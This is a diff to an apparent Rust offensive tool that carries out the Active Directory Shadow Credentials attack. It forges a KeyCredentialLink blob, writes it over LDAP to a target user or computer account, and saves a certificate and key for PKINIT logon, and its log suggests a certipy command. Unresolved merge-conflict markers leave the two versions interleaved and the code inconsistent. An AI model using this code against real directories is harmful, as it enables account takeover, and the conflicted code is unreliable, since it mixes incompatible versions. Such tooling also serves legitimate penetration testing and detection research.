@@ -111,48 +111,80 @@ pub struct KeyPair {
 }
 
 // ═══════════════════════════════════════════════════════════
-//  Key Credential Structure (DS_REPL_VALUE_META_DATA)
+//  Key Credential Structure (KEYCREDENTIALLINK_BLOB per MS-ADTS §2.2.20)
 // ═══════════════════════════════════════════════════════════
 
-/// KeyCredential binary structure (MS-ADTS)
+/// Build a `KEYCREDENTIALLINK_BLOB` binary value suitable for writing to
+/// the `msDS-KeyCredentialLink` attribute.
 ///
-/// Structure:
-/// - Version: 1 byte (0x01)
-/// - Flags: 1 byte (0x00 for user, 0x01 for computer)
-/// - KeyId: 16 bytes (GUID)
-/// - KeyUsage: 4 bytes
-/// - KeySource: 4 bytes
-/// - KeyAlgorithm: variable
-/// - KeyMaterial: variable
-pub fn build_key_credential(key_id: &str, public_key: &[u8], is_computer: bool) -> Vec<u8> {
-    let mut cred = Vec::new();
+/// The format is a 4-byte LE version (0x00000200) followed by a sequence
+/// of TLV entries: 2-byte LE length | 1-byte tag | <length> bytes of value.
+///
+/// Tag assignments (MS-ADTS §2.2.20.1):
+///  0x01  KeyID          — SHA-256 of the SubjectPublicKeyInfo DER
+///  0x02  KeyHash        — SHA-256 of the entire blob (minus this entry), computed last
+///  0x03  KeyMaterial    — SubjectPublicKeyInfo in DER format
+///  0x04  KeyUsage       — 0x01 = NGC (Windows Hello / smartcard-logon key)
+///  0x05  KeySource      — 0x00 = AD
+///  0x09  DeviceId       — random GUID in little-endian bytes
+///  0x0A  CustomKeyInfo  — [0x01, 0x00] (version=1, flags=0)
+///  0x0C  KeyCreationTime— Windows FILETIME (100-ns ticks since 1601-01-01) as 8-byte LE
+pub fn build_key_credential(public_key_der: &[u8], device_id_bytes: &[u8; 16]) -> Vec<u8> {
+    use sha2::{Digest, Sha256};
 
-    // Version
-    cred.push(0x01);
+    // Helper: write one TLV entry (2-byte LE length | 1-byte tag | data).
+    fn tlv(tag: u8, data: &[u8]) -> Vec<u8> {
+        let mut entry = Vec::with_capacity(3 + data.len());
+        let len = data.len() as u16;
+        entry.extend_from_slice(&len.to_le_bytes());
+        entry.push(tag);
+        entry.extend_from_slice(data);
+        entry
+    }
 
-    // Flags: 0x00 for user, 0x01 for computer
-    cred.push(if is_computer { 0x01 } else { 0x00 });
+    // KeyID = SHA-256 of SubjectPublicKeyInfo DER
+    let key_id: Vec<u8> = Sha256::digest(public_key_der).to_vec();
 
-    // KeyId: 16 bytes GUID
-    let guid = parse_guid(key_id);
-    cred.extend_from_slice(&guid);
+    // KeyUsage: NGC (0x01)
+    let key_usage = [0x01u8];
+    // KeySource: AD (0x00)
+    let key_source = [0x00u8];
+    // CustomKeyInformation: version=1, flags=0
+    let custom_key_info = [0x01u8, 0x00u8];
 
-    // KeyUsage: KeyUsage::KerberosAuthentication = 2
-    cred.extend_from_slice(&2u32.to_le_bytes());
+    // KeyCreationTime: Windows FILETIME = 100-ns ticks since 1601-01-01
+    // Unix epoch offset from Windows epoch: 11644473600 seconds
+    let unix_secs = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs();
+    // Use saturating arithmetic to avoid any hypothetical overflow.
+    let filetime: u64 = unix_secs
+        .saturating_add(11_644_473_600)
+        .saturating_mul(10_000_000);
+    let creation_time = filetime.to_le_bytes();
 
-    // KeySource: KeySource::AD = 0
-    cred.extend_from_slice(&0u32.to_le_bytes());
+    // Build blob without KeyHash (tag 0x02) first — hash is computed over this
+    let mut blob = Vec::new();
+    blob.extend_from_slice(&0x0000_0200u32.to_le_bytes()); // Version = 0x00000200 LE → [0x00, 0x02, 0x00, 0x00]
+    blob.extend_from_slice(&tlv(0x01, &key_id)); // KeyID
+    blob.extend_from_slice(&tlv(0x03, public_key_der)); // KeyMaterial
+    blob.extend_from_slice(&tlv(0x04, &key_usage)); // KeyUsage
+    blob.extend_from_slice(&tlv(0x05, &key_source)); // KeySource
+    blob.extend_from_slice(&tlv(0x09, device_id_bytes)); // DeviceId
+    blob.extend_from_slice(&tlv(0x0A, &custom_key_info)); // CustomKeyInfo
+    blob.extend_from_slice(&tlv(0x0C, &creation_time)); // KeyCreationTime
 
-    // KeyAlgorithm length and algorithm
-    let algorithm = b"RSA";
-    cred.extend_from_slice(&(algorithm.len() as u32).to_le_bytes());
-    cred.extend_from_slice(algorithm);
+    // KeyHash = SHA-256 of the blob so far, inserted after Version
+    let key_hash: Vec<u8> = Sha256::digest(&blob).to_vec();
+    let hash_entry = tlv(0x02, &key_hash);
 
-    // KeyMaterial length and public key
-    cred.extend_from_slice(&(public_key.len() as u32).to_le_bytes());
-    cred.extend_from_slice(public_key);
-
-    cred
+    // Final blob: Version | KeyHash entry | remaining entries
+    let mut final_blob = Vec::with_capacity(4 + hash_entry.len() + blob.len() - 4);
+    final_blob.extend_from_slice(&blob[..4]); // Version
+    final_blob.extend_from_slice(&hash_entry);
+    final_blob.extend_from_slice(&blob[4..]);
+    final_blob
 }
 
 /// Parse a GUID string to bytes
@@ -260,11 +292,11 @@ fn format_guid_from_hex(hex: &str) -> Option<String> {
 /// Execute the Shadow Credentials attack
 ///
 /// This function:
-/// 1. Generates a key pair
-/// 2. Builds the KeyCredential structure
-/// 3. Writes it to the target via LDAP
-/// 4. (Optionally) authenticates via PKINIT
-/// 5. (Optionally) cleans up
+/// 1. Generates an RSA key pair + self-signed X.509 certificate
+/// 2. Builds the KEYCREDENTIALLINK_BLOB with correct TLV structure
+/// 3. Resolves the target DN via LDAP search
+/// 4. Writes the blob to msDS-KeyCredentialLink via LDAP modify-add
+/// 5. Saves the certificate and private key to disk for subsequent PKINIT
 ///
 /// Note: Requires LDAP session with write access to msDS-KeyCredentialLink
 pub async fn execute(
@@ -276,14 +308,31 @@ pub async fn execute(
     // Step 1: Generate key pair
     let key_pair = generate_key_pair(config.key_size)?;
     info!(
-        "ShadowCredentials: Generated key pair (key_id={})",
-        key_pair.key_id
+        "ShadowCredentials: Generated {}-bit RSA key pair (key_id={})",
+        config.key_size, key_pair.key_id
     );
 
-    // Step 2: Build key credential using DER-encoded public key
-    let is_computer = config.target.ends_with('$');
-    let cred_data = build_key_credential(&key_pair.key_id, &key_pair.public_key_der, is_computer);
+    // Step 2: Build KEYCREDENTIALLINK_BLOB with proper TLV structure
+    let device_id = uuid_to_bytes_le(&uuid::Uuid::new_v4());
+    let cred_blob = build_key_credential(&key_pair.public_key_der, &device_id);
+    info!(
+        "ShadowCredentials: KeyCredential blob built ({} bytes)",
+        cred_blob.len()
+    );
 
+<<<<<<< HEAD
+    // Step 3: Resolve target DN via LDAP
+    let target_filter = if config.target.contains(',') {
+        // Already a DN
+        format!("(distinguishedName={})", config.target)
+    } else if config.target.ends_with('$') {
+        format!(
+            "(&(objectClass=computer)(sAMAccountName={}))",
+            config.target
+        )
+    } else {
+        format!("(&(objectClass=user)(sAMAccountName={}))", config.target)
+=======
     // Resolve the actual DN of the target via LDAP search so the DN-with-Binary
     // value includes the correct distinguished name rather than an empty string.
     let target_dn = {
@@ -314,19 +363,43 @@ pub async fn execute(
         raw_value: cred_data.clone(),
         created: Utc::now(),
         is_ours: true,
+>>>>>>> origin/main
     };
 
-    // Step 3: Build the LDAP modification value
-    let ldap_mod_value = build_ldap_modification(&key_cred);
+    let entries = ldap
+        .custom_search(&target_filter, &["distinguishedName"])
+        .await
+        .map_err(|e| OverthroneError::TicketForge(format!("LDAP search for target failed: {e}")))?;
+
+    let target_dn = entries.first().map(|e| e.dn.clone()).ok_or_else(|| {
+        OverthroneError::TicketForge(format!("Target '{}' not found in AD", config.target))
+    })?;
+
+    info!("ShadowCredentials: Resolved target DN: {}", target_dn);
+
+    // Step 4: Write blob to msDS-KeyCredentialLink
+    if let Err(e) = ldap
+        .modify_add_binary(&target_dn, "msDS-KeyCredentialLink", cred_blob)
+        .await
+    {
+        return Ok(ShadowCredentialsResult {
+            target: config.target.clone(),
+            success: false,
+            key_id: key_pair.key_id,
+            cleaned_up: false,
+            tgt: None,
+            error: Some(format!("LDAP write failed: {e}")),
+        });
+    }
+
     info!(
-        "ShadowCredentials: KeyCredential built ({} bytes)",
-        cred_data.len()
-    );
-    info!(
-        "ShadowCredentials: LDAP mod value: {}",
-        &ldap_mod_value[..ldap_mod_value.len().min(80)]
+        "ShadowCredentials: msDS-KeyCredentialLink written for {}",
+        target_dn
     );
 
+<<<<<<< HEAD
+    // Step 5: Save key material to disk for PKINIT (e.g., via certipy or Rubeus)
+=======
     // Attempt the LDAP write to apply the msDS-KeyCredentialLink modification.
     // success is only set to true after the LDAP modify operation is confirmed.
     let ldap_write_ok = match ldap
@@ -344,6 +417,7 @@ pub async fn execute(
     };
 
     // Save key material to files for external PKINIT tools
+>>>>>>> origin/main
     let output_prefix = format!("shadow_creds_{}", &key_pair.key_id[..8]);
     let cert_path = format!("{output_prefix}.pem");
     let key_path = format!("{output_prefix}.key");
@@ -359,7 +433,16 @@ pub async fn execute(
         info!("ShadowCredentials: Private key written to {key_path}");
     }
 
+<<<<<<< HEAD
+    info!(
+        "ShadowCredentials: Attack complete. Use the certificate and key for PKINIT:\n  \
+         certipy auth -pfx {}.pfx -dc-ip <DC>",
+        output_prefix
+    );
+
+=======
     // success is set only after LDAP write verification
+>>>>>>> origin/main
     Ok(ShadowCredentialsResult {
         target: config.target.clone(),
         success: ldap_write_ok,
@@ -372,6 +455,18 @@ pub async fn execute(
             Some("LDAP write not confirmed — apply key material manually".to_string())
         },
     })
+}
+
+/// Convert a UUID to 16 bytes in Windows GUID byte order (little-endian fields).
+fn uuid_to_bytes_le(uuid: &uuid::Uuid) -> [u8; 16] {
+    let bytes = uuid.as_bytes();
+    // Windows GUID layout: Data1 (4 LE) | Data2 (2 LE) | Data3 (2 LE) | Data4 (8 bytes)
+    [
+        bytes[3], bytes[2], bytes[1], bytes[0], // Data1 LE
+        bytes[5], bytes[4], // Data2 LE
+        bytes[7], bytes[6], // Data3 LE
+        bytes[8], bytes[9], bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15],
+    ]
 }
 
 /// Generate RSA key pair and self-signed X.509 certificate for PKINIT.
@@ -488,13 +583,13 @@ mod tests {
 
     #[test]
     fn test_build_key_credential() {
-        let key_id = generate_key_id();
-        let public_key = b"test_public_key";
-        let cred = build_key_credential(&key_id, public_key, false);
+        let public_key = b"test_public_key_der_blob";
+        let device_id = [0u8; 16];
+        let cred = build_key_credential(public_key, &device_id);
 
-        assert!(!cred.is_empty());
-        assert_eq!(cred[0], 0x01); // Version
-        assert_eq!(cred[1], 0x00); // Flags (user)
+        // Blob must start with version 0x00000200 in little-endian
+        assert!(cred.len() > 4);
+        assert_eq!(&cred[..4], &[0x00, 0x02, 0x00, 0x00]);
     }
 
     #[test]
